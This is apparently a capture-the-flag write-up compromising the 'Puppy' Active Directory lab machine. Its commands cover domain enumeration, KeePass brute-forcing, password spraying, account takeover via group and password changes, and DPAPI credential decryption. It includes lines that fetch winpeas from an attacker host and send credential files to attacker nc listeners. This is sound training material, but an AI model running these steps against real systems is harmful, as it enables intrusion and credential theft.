# Puppy

## Recon

> **Machine Information**: As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james / KingofAkron2025!`

::: details nmap_scan.log
```log
Open 10.10.11.70:53
Open 10.10.11.70:88
Open 10.10.11.70:111
Open 10.10.11.70:135
Open 10.10.11.70:139
Open 10.10.11.70:389
Open 10.10.11.70:445
Open 10.10.11.70:464
Open 10.10.11.70:593
Open 10.10.11.70:2049
Open 10.10.11.70:3260
Open 10.10.11.70:3268
Open 10.10.11.70:5985
Open 10.10.11.70:9389
Open 10.10.11.70:49664
Open 10.10.11.70:49667
Open 10.10.11.70:49669
Open 10.10.11.70:49674
Open 10.10.11.70:49696
Open 10.10.11.70:55144
Open 10.10.11.70:56540
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.70

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-03 16:55:43Z)
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
2049/tcp  open  nlockmgr      syn-ack 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         syn-ack Microsoft Windows RPC
55144/tcp open  msrpc         syn-ack Microsoft Windows RPC
56540/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-03T16:57:39
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 35771/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 25461/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
```
:::

## General Enum

Enumerate the domain
```bash
└─$ cicada-mastertul -q -u 'levi.james' -p 'KingofAkron2025!' -t 10.10.11.70 -d puppy.htb --full
----------------HAPPY HAUNTING!!----------------
Target IP: 10.10.11.70
Domain: puppy.htb
Username: levi.james
Password: KingofAkron2025!

Full Mode Enabled
------------------------------------------------
[!] Enumerating SMB...
[~] Commnad: faketime -f +7h netexec smb puppy.htb --timeout 99 -u 'levi.james' -p 'KingofAkron2025!' --shares
[+] SMB share drive names saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/smb_results/share_names.txt
[+] SMB share drives list saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/smb_results/share_drives.txt
[*] Downloading SMB share files to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/smb_results
[~] Commnad: faketime -f +7h netexec smb puppy.htb --timeout 99 -u 'levi.james' -p 'KingofAkron2025!' -M spider_plus -o DOWNLOAD_FLAG=True
[!] Connecting to WinRM...
[~] Commnad: faketime -f +7h netexec winrm puppy.htb --timeout 99 -u 'levi.james' -p 'KingofAkron2025!'
[-] Could not connect to WinRM
[!] Enumerating users with netexec rib bruteforce (up to 5000)...
[~] Commnad: faketime -f +7h netexec smb puppy.htb --timeout 99 -u 'levi.james' -p 'KingofAkron2025!' --rid-brute 5000
[+] Lookupsids saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/lookupsid_results/lookupsid.txt
[+] Users list saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/lookupsid_results/users.txt
[!] Enumerating NPUsers using impacket...
[~] Commnad: faketime -f +7h impacket-GetNPUsers 'puppy.htb'/'levi.james':'KingofAkron2025!'@'10.10.11.70'  -usersfile /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/lookupsid_results/users.txt
[-] No NPUsers found
[!] Enumerating UserSPNs using impacket...
[~] Commnad: faketime -f +7h impacket-GetUserSPNs 'puppy.htb'/'levi.james':'KingofAkron2025!'@'10.10.11.70'  -request -dc-host puppy.htb
[-] No UserSPNs found
[!] Collecting Bloodhound Files...
[~] Commnad: faketime -f +7h bloodhound-python -d puppy.htb -u 'levi.james' -ns 10.10.11.70 -c all --dns-timeout 100 --zip -op levi.james -p 'KingofAkron2025!'
[+] Bloodhound saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/bloodhound_results
[!] Enumerating LDAP...
[~] Commnad: faketime -f +7h ldapdomaindump -u 'puppy.htb\levi.james' -dc-ip 10.10.11.70 -o /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/ldap_results -p 'KingofAkron2025!'
[+] LDAP saved to /home/woyag/Desktop/Rooms/Puppy/mastertool/10.10.11.70/ldap_results
[!x!] Cleaning up...
```

## SMB

No read permissions on DEV share.
```bash
└─$ cat ./smb_results/share_drives.txt
SMB                      10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB                      10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB                      10.10.11.70     445    DC               [*] Enumerated shares
SMB                      10.10.11.70     445    DC               Share           Permissions     Remark
SMB                      10.10.11.70     445    DC               -----           -----------     ------
SMB                      10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB                      10.10.11.70     445    DC               C$                              Default share
SMB                      10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB                      10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB                      10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB                      10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

Our target is going to be `adam.silver` and `steph.cooper` since they are part of Remote Management Users group (ability to winrm).

![Writeup.png](/assets/pentest/htb/puppy/Writeup.png)

![Writeup-1.png](/assets/pentest/htb/puppy/Writeup-1.png)

![Writeup-2.png](/assets/pentest/htb/puppy/Writeup-2.png)

`levi.james` is part of **HR** group which has **GenericWrite** on **Developers** group, the group which contains `adam.silver`, the user which belongs to **Remote Management Users** group.

`adam.silver` will be the lateral movement target.

### Developers

But first let's join Developers:
```bash
└─$ bloodyAD -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'
[+] levi.james added to DEVELOPERS
```

```bash
└─$ smbclient -U 'PUPPY.HTB'/'levi.james'%'KingofAkron2025!' //10.10.11.70/DEV
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1646852 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \KeePassXC-2.7.9-Win64.msi of size 34394112 as KeePassXC-2.7.9-Win64.msi (4981.2 KiloBytes/sec) (average 4981.2 KiloBytes/sec)
getting file \recovery.kdbx of size 2677 as recovery.kdbx (8.9 KiloBytes/sec) (average 4773.4 KiloBytes/sec)
```

### Keepass

We'll need to view it, but john doesn't support this version yet.
```bash
└─$ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

[Brute Forcing KeePass Database Passwords](https://medium.com/@toneillcodes/brute-forcing-keepass-database-passwords-cbe2433b7beb) -> [brutalkeepass](https://github.com/toneillcodes/brutalkeepass)

```bash
└─$ git clone -q https://github.com/toneillcodes/brutalkeepass.git
└─$ cd brutalkeepass
└─$ py -m venv venv
└─$ . ./venv/bin/activate
└─$ pip install -r requirements.txt
└─$ py ./bfkeepass.py -d ../smb_dev/recovery.kdbx -w $rockyou -o # Took few minutes~
[*] Running bfkeepass
[*] Starting bruteforce process...
[!] Success! Database password: liverpool
[>] Dumping entries...
--------------------
[>] Title: JAMIE WILLIAMSON
[>] Username: None
[>] Password: JamieLove2025!
[>] URL: puppy.htb
[>] Notes: None
--------------------
[>] Title: ADAM SILVER
[>] Username: None
[>] Password: HJKL2025!
[>] URL: puppy.htb
[>] Notes: None
--------------------
[>] Title: ANTONY C. EDWARDS
[>] Username: None
[>] Password: Antman2025!
[>] URL: puppy.htb
[>] Notes: None
--------------------
[>] Title: STEVE TUCKER
[>] Username: None
[>] Password: Steve2025!
[>] URL: puppy.htb
[>] Notes: None
--------------------
[>] Title: SAMUEL BLAKE
[>] Username: None
[>] Password: ILY2025!
[>] URL: puppy.htb
[>] Notes: None
--------------------
[>] Entry dump complete.
[*] Stopping bruteforce process.
[*] Done.
```

### Senion Developer

```bash
└─$ netexec smb puppy.htb -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:JamieLove2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Steve2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Steve2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:Steve2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:Steve2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:ILY2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:ILY2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steve.tucker:ILY2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\samuel.blake:ILY2025! STATUS_LOGON_FAILURE
```

Login as `ant.edwards` is a success.

> Creds: `ant.edwards:Antman2025!`

This user is part of **Senior Devs** group and has **GenericAll** access to our target account.

![Writeup-3.png](/assets/pentest/htb/puppy/Writeup-3.png)

```bash
└─$ sudo ntpdate puppy.htb
2025-07-03 14:27:06.327408 (-0400) +25200.526634 +/- 0.035621 puppy.htb 10.10.11.70 s1 no-leap
CLOCK: time stepped by 25200.526634

└─$ echo $(( 25200.526634 / 60 / 60 ))
7.0001462872222229

└─$ faketime -f +7h certipy-ad shadow auto -u 'ant.edwards@puppy.htb' -p 'Antman2025!' -account 'adam.silver' -target 'dc.puppy.htb' -dc-ip '10.10.11.70' -scheme 'ldap' -dns-tcp
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'adam.silver'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '441da56e-c951-ff0d-dd97-a9c219cd2c76'
[*] Adding Key Credential with device ID '441da56e-c951-ff0d-dd97-a9c219cd2c76' to the Key Credentials for 'adam.silver'
[*] Successfully added Key Credential with device ID '441da56e-c951-ff0d-dd97-a9c219cd2c76' to the Key Credentials for 'adam.silver'
[*] Authenticating as 'adam.silver' with the certificate
[*] Using principal: adam.silver@puppy.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[*] Restoring the old Key Credentials for 'adam.silver'
[*] Successfully restored the old Key Credentials for 'adam.silver'
[*] NT hash for 'adam.silver': None
```

Shadow credentials attack succeeds, but also fails..

If we inspect the user, it's **disabled**
```bash
└─$ bloodyAD -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' --host 10.10.11.70 get object adam.silver
...
badPasswordTime: 2025-07-03 21:38:23.649352+00:00
...
pwdLastSet: 2025-07-04 00:34:29.227432+00:00
...
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT
...
```

[Use the UserAccountControl flags to manipulate user account properties](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)

For some reason `bloodyAD` kept failing to set property 
```bash
└─$ bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.10.11.70 set object adam.silver userAccountControl -v 512
...
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB! Result code: "invalidAttributeSyntax" Reason: "b'00000057: LdapErr: DSID-0C091330, comment: Error in attribute conversion operation, data 0, v4f7c\x00'"
```

`powerview.py` to the rescue
```powershell
└─$ powerview 'PUPPY.HTB'/'ant.edwards':'Antman2025!'@'10.10.11.70'
(LDAP)-[DC.PUPPY.HTB]-[PUPPY\ant.edwards]
PV > Set-ADObject -Identity adam.silver -Set userAccountControl=512
[2025-07-03 14:43:29] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB

(LDAP)-[DC.PUPPY.HTB]-[PUPPY\ant.edwards]
PV > Get-ADObject -Identity adam.silver -Properties userAccountControl
userAccountControl     : NORMAL_ACCOUNT [512]
```

Found passwords didn't work and neither shadow credentials attack.
```bash
└─$ netexec smb puppy.htb -u usernames.txt -p passwords.txt --continue-on-success
└─$ faketime -f +7h certipy-ad shadow auto -u 'ant.edwards@puppy.htb' -p 'Antman2025!' -account 'adam.silver' -target 'dc.puppy.htb' -dc-ip '10.10.11.70' -scheme 'ldap' -dns-tcp -k
```

## WinRM

Changing the password is usually terrible for OPSEC, so I avoid it whenever possible. Unfortunately, this time there's no way around it.

```powershell
└─$ bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'puppy.htb' --host 10.10.11.70 set password adam.silver 'Password123$'
[+] Password changed successfully!

└─$ netexec winrm puppy.htb -u 'adam.silver' -p 'Password123$'
WINRM       10.10.11.70     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.10.11.70     5985   DC               [+] PUPPY.HTB\adam.silver:Password123$ (Pwn3d!)

└─$ evil-winrm -i dc.puppy.htb -u 'adam.silver' -p 'Password123$'
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /all
User Name         SID
================= ==============================================
puppy\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PUPPY\DEVELOPERS                            Group            S-1-5-21-1487982659-1829050783-2281216199-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cat ../Desktop/user.txt
070f2e5db1472b437138f40a1db47e58
```

## Privilege Escalation (steph.cooper)

```powershell
*Evil-WinRM* PS C:\> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows

*Evil-WinRM* PS C:\> ls -rec ./Backups |%{$_.FullName}
C:\Backups\site-backup-2024-12-30.zip
*Evil-WinRM* PS C:\> ls -rec ./StorageReports |%{$_.FullName}
C:\StorageReports\Scheduled
*Evil-WinRM* PS C:\> download C:\Backups\site-backup-2024-12-30.zip
```

```bash
└─$ unzip site-backup-2024-12-30.zip
└─$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

```powershell
└─$ evil-winrm -i 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami /all

User Name          SID
================== ==============================================
puppy\steph.cooper S-1-5-21-1487982659-1829050783-2281216199-1107

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

## Privilege Escalation (steph.cooper_adm)

We have access to admin account, but with lower prioritities.

![Writeup-4.png](/assets/pentest/htb/puppy/Writeup-4.png)

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\Music> curl.exe 10.10.14.18/winpeas.exe -O
*Evil-WinRM* PS C:\Users\steph.cooper\Music> .\winpeas.exe | tee -filepath winpeas.log
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================
...

# Masterkey
*Evil-WinRM* PS C:\Users\steph.cooper\Music> ls 'C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect' -rec -file -force | %{$_.FullName}
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\CREDHIST
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\SYNCHIST
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\Preferred
```

### DPAPI

[https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

WinRM `download` command gets messy with  hidden files, so I'll just use TCP sockets in powershell.
```bash
└─$ nc -lvnp 4444 > DFBE70A7E5CC19A398EBF1B96859CE5D &
nc -lvnp 4445 > C8D69EBE9A43E9DEBF6B5FBD48B521B9 &
nc -lvnp 4446 > 556a2412-1275-4ccf-b721-e6a0b4f90407 & 

---

*Evil-WinRM* PS C:\Users\steph.cooper\Music> function SendOverTcp { param([string]$server, $port, $filePath); ($tcpClient = New-Object Net.Sockets.TcpClient($server, $port)).GetStream().Write(($bytes = [IO.File]::ReadAllBytes($filePath)), 0, $bytes.Length); $tcpClient.Close() }
*Evil-WinRM* PS C:\Users\steph.cooper\Music> SendOverTcp "10.10.14.18" 4444 "C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
*Evil-WinRM* PS C:\Users\steph.cooper\Music> SendOverTcp "10.10.14.18" 4445 "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
*Evil-WinRM* PS C:\Users\steph.cooper\Music> SendOverTcp "10.10.14.18" 4446 "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"
```

Decrypt a master key
```bash
└─$ impacket-dpapi masterkey -file "./556a2412-1275-4ccf-b721-e6a0b4f90407" -sid "S-1-5-21-1487982659-1829050783-2281216199-1107" -password 'ChefSteph2025!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Dump credentials
```bash
└─$ impacket-dpapi credential -file "./DFBE70A7E5CC19A398EBF1B96859CE5D" -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 16:14:09
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Unknown     :
Username    : 02vpdyzbbgyaqelf
Unknown     :

└─$ impacket-dpapi credential -file "./C8D69EBE9A43E9DEBF6B5FBD48B521B9" -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

### Root.txt

```bash
└─$ evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
*Evil-WinRM* PS C:\Users\steph.cooper_adm> cat /Users/Administrator/Desktop/root.txt
568cf221178895463c1e4778864efb43
```

> Flag: `568cf221178895463c1e4778864efb43`

